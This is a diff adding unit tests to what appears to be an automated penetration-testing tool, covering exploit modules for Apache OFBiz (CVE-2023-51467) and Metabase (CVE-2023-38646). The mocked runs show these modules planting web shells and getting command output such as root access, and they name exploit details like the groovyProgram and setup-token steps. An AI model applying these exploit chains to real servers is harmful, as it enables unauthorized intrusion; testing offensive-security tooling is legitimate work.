@@ -10,6 +10,8 @@ from breachload.core.state import EngagementState, Finding, Phase, Severity
 from breachload.exploit.footholds import (
     FreepbxFoothold,
     GlpiHtmlawedFoothold,
+    MetabaseFoothold,
+    OfbizGroovyFoothold,
     foothold_for,
 )
 from breachload.safety.audit import AuditLog
@@ -26,8 +28,54 @@ class TestFootholdRegistry:
     def test_glpi_registered(self):
         assert isinstance(foothold_for("CVE-2022-35914"), GlpiHtmlawedFoothold)
 
+    def test_ofbiz_registered(self):
+        assert isinstance(foothold_for("CVE-2023-51467"), OfbizGroovyFoothold)
+
+    def test_metabase_registered(self):
+        assert isinstance(foothold_for("CVE-2023-38646"), MetabaseFoothold)
+
     def test_unknown_cve(self):
         assert foothold_for("CVE-0000-0000") is None
+
+
+class TestOfbizEstablish:
+    def test_establishes_webshell(self):
+        calls = []
+
+        def runner(argv, timeout):
+            calls.append(argv)
+            if "bl-shell.jsp" in argv[-1] and "cmd=" in argv[-1]:
+                return 0, "uid=0(root)", ""
+            return 0, "", ""
+
+        sess = OfbizGroovyFoothold().establish("10.10.11.9", 443, runner=runner,
+                                               sleeper=lambda s: None)
+        assert sess is not None and "bl-shell.jsp?cmd=FUZZ" in sess.template
+        # The drop request went through ProgramExport with requirePasswordChange=Y.
+        assert any("requirePasswordChange=Y" in tok for a in calls for tok in a)
+        assert any("groovyProgram=" in tok for a in calls for tok in a)
+
+
+class TestMetabaseEstablish:
+    def test_needs_setup_token(self):
+        # /api/session/properties returns nothing useful -> no session.
+        sess = MetabaseFoothold().establish("10.10.11.9", 3000,
+                                            runner=lambda a, t: (0, "{}", ""),
+                                            sleeper=lambda s: None)
+        assert sess is None
+
+    def test_establishes_webshell(self):
+        def runner(argv, timeout):
+            url = argv[-1]
+            if url.endswith("/api/session/properties"):
+                return 0, '{"setup-token":"deadbeef-token"}', ""
+            if "/tmp/shell.php" in url and "cmd=" in url:
+                return 0, "uid=999(metabase)", ""
+            return 0, "", ""
+
+        sess = MetabaseFoothold().establish("10.10.11.9", 3000, runner=runner,
+                                            sleeper=lambda s: None)
+        assert sess is not None and "/tmp/shell.php?cmd=FUZZ" in sess.template
 
 
 class TestGlpiEstablish:
